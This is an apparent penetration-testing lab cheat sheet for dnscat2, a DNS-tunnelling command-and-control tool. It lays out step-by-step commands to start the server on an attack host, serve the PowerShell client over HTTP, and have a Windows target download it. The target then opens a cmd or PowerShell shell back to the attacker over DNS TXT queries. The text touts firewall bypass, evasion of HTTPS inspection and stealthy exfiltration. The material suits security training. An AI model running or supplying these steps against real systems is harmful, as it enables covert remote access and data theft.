# Dnscat2 - Quick Workflow

## What is Dnscat2?

**Dnscat2** = DNS tunneling tool for C2 over DNS (TXT records)

**Why Use It**:
- ✅ Bypasses firewalls
- ✅ Evades HTTPS inspection
- ✅ Encrypted C2 channel
- ✅ Stealthy exfiltration

## Quick Setup

### 1. Install Server (Attack Host)
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

### 2. Start Server
```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

**Output**:
```
Secret: 0ec04a91cd1e963f8c03ca499d589d21
[Save this secret!]
```

### 3. Setup Client (Windows Target)
```bash
# On attack host - clone PowerShell client
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Transfer to Windows
# (via HTTP, SMB, RDP, etc.)
```

### 4. Run Client (Windows)
```powershell
# Import module
Import-Module .\dnscat2.ps1

# Start tunnel (CMD shell)
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

### 5. Interact with Session (Attack Host)
```bash
# Server shows:
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!

# List options
dnscat2> ?

# Interact with session
dnscat2> window -i 1

# Drop to shell
C:\Windows\system32>
```

## Complete Example

```bash
# ATTACK HOST
# 1. Start server
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
# Note the secret: 0ec04a91cd1e963f8c03ca499d589d21

# 2. Clone PowerShell client
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# 3. Host for download
cd dnscat2-powershell
python3 -m http.server 8000

# WINDOWS TARGET
# 4. Download client
iwr http://10.10.14.18:8000/dnscat2.ps1 -OutFile dnscat2.ps1

# 5. Import and run
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

# ATTACK HOST
# 6. Interact
dnscat2> windows  # List sessions
dnscat2> window -i 1  # Interact with session 1
```

## Common Commands

```bash
# Server commands
?               # Help
windows         # List sessions
window -i 1     # Interact with session 1
kill 1          # Kill session 1
quit            # Exit dnscat2
```

## Client Options

```powershell
# CMD shell
Start-Dnscat2 -DNSserver IP -Domain DOMAIN -PreSharedSecret SECRET -Exec cmd

# PowerShell
Start-Dnscat2 -DNSserver IP -Domain DOMAIN -PreSharedSecret SECRET -Exec powershell

# Custom command
Start-Dnscat2 -DNSserver IP -Domain DOMAIN -PreSharedSecret SECRET -Exec "C:\tool.exe"
```

## Traffic Flow

```
Windows Target
    ↓
DNS TXT requests to 10.10.14.18:53
    ↓
Dnscat2 server decrypts
    ↓
C2 shell access
```

## Key Points

🔴 **Remember**:
- Server needs port 53 (requires sudo)
- Save the pre-shared secret
- Traffic looks like DNS queries
- Encrypted by default
- Very stealthy

🎯 **Use When**:
- Firewalls block other protocols
- HTTPS inspection enabled
- DNS allowed outbound
- Need covert C2 channel

## Quick Reference

| Task | Command |
|------|---------|
| **Start server** | `sudo ruby dnscat2.rb --dns host=IP,port=53,domain=DOMAIN` |
| **Start client** | `Start-Dnscat2 -DNSserver IP -Domain DOMAIN -PreSharedSecret SECRET -Exec cmd` |
| **List sessions** | `windows` |
| **Interact** | `window -i 1` |
| **Exit session** | `CTRL+Z` |
